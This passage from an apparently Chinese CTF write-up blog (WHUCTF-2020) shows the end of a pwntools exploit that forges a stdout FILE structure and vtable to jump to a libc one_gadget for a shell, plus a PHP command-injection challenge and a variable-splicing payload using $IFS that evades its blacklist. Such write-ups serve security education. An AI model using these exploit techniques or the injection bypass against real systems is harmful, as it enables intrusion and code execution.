class="number">0x3c56a3</span>)*<span class="number">7</span></span><br><span class="line">fake_stdout += p64(libc.address+<span class="number">0x3c56a3</span>+<span class="number">1</span>)+p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_stdout += p64(libc.address+<span class="number">0x3c48e0</span>)</span><br><span class="line">fake_stdout += p64(<span class="number">1</span>)+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_stdout += p64(<span class="number">0x000000000a000000</span>)+p64(libc.address+<span class="number">0x3c6780</span>)</span><br><span class="line">fake_stdout += p64(<span class="number">0xffffffffffffffff</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_stdout += p64(libc.address+<span class="number">0x3c47a0</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_stdout += p64(<span class="number">0x00000000ffffffff</span>)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_stdout += p64(ptr_p+<span class="number">0xe0</span>)</span><br><span class="line">one_gadget = libc.address+<span class="number">987463</span></span><br><span class="line">fake_vtalbe = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_vtalbe += p64(one_gadget)*<span class="number">20</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Offset:\n'</span>,<span class="string">'0'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Size:\n'</span>,str(<span class="number">0xffff0050</span>))</span><br><span class="line">p.sendafter(<span class="string">'Input data:\n'</span>,fake_stdout+fake_vtalbe)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Offset:\n'</span>,<span class="string">'-64'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Size:\n'</span>,str(<span class="number">8</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="string">'Input data:\n'</span>,p64(ptr_p))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="heaptrick"><a href="#heaptrick" class="headerlink" title="heaptrick"></a>heaptrick</h3><p>太菜了QAQ，不会做！坐等wp</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezcmd"><a href="#ezcmd" class="headerlink" title="ezcmd"></a>ezcmd</h3><p>给了源码可以看到过滤的有点多，但是没过滤$</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/tac|rm|echo|cat|nl|less|more|tail|head/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"cat't read flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip); </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>so..变量替换可以直接过</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=ca;b=t;d=ag.php;c=fl;$a$b$IFS$c$d</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/Links/">Links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">1.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnpwnpwn"><span class="toc-number">1.1.</span> <span class="toc-text">pwnpwnpwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode"><span class="toc-number">1.2.</span> <span class="toc-text">shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FFF"><span class="toc-number">1.3.</span> <span class="toc-text">FFF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attention"><span class="toc-number">1.4.</span> <span class="toc-text">attention</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arbitrary"><span class="toc-number">1.5.</span> <span class="toc-text">arbitrary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overflow"><span class="toc-number">1.6.</span> <span class="toc-text">overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#heaptrick"><span class="toc-number">1.7.</span> <span class="toc-text">heaptrick</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezcmd"><span class="toc-number">2.1.</span> <span class="toc-text">ezcmd</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://startpwn.top/2020/05/28/whuctf-2020-pwn/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&text=WHUCTF-2020 部分题目wp" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&title=WHUCTF-2020 部分题目wp" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&is_video=false&description=WHUCTF-2020 部分题目wp" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WHUCTF-2020 部分题目wp&body=Check out this article: http://startpwn.top/2020/05/28/whuctf-2020-pwn/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&title=WHUCTF-2020 部分题目wp" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&title=WHUCTF-2020 部分题目wp" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&title=WHUCTF-2020 部分题目wp" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&title=WHUCTF-2020 部分题目wp" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&name=WHUCTF-2020 部分题目wp&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&t=WHUCTF-2020 部分题目wp" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2020
+    ssta
+    <a href="http://www.beian.miit.gov.cn/" target="_blank" rel="noopener" >津ICP备20002899号</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/Links/">Links</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
